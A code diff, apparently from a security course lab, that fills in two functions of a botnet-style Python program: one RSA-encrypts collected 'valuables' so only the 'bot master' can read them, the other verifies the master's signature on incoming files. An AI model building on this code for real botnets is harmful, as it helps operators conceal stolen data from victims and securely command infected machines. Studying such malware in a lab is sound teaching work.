@@ -15,11 +15,12 @@ def save_valuable(data):
     valuables.append(data)
 
 def encrypt_for_master(data):
-    # TODO: Encrypt the file so it can only be read by the bot master
-    #data = data.decode('utf-8')
-    #h = SHA.new(message)
+    # Encrypt the file so it can only be read by the bot master
+    
+    #load the public key
     key = RSA.importKey(open('pubkey.pem').read())
     cipher = PKCS1_v1_5_cipher.new(key)
+    #encrypt the file using public key
     ciphertext = cipher.encrypt(data)
     return ciphertext
 
@@ -40,18 +41,15 @@ def upload_valuables_to_pastebot(fn):
 
 def verify_file(f):
     # Verify the file was sent by the bot master
-    # TODO: For Part 2, you'll use public key crypto here
-    # Naive verification by ensuring the first line has the "passkey"
 
-    #try:
-    #    signature,message = f.split(bytes("Caesar", "ascii"))
-    #except ValueError:
-    #    return False
+    #split file into signature and message parts
     signature = f[0:256]
     message = f[256:]
+    #load the public key
     key = RSA.importKey(open('pubkey.pem').read())
     hashed = SHA384.new(message)
     verifier = PKCS1_v1_5.new(key)
+    #verify the file with its signature
     if verifier.verify(hashed, signature):
         return True
     else:
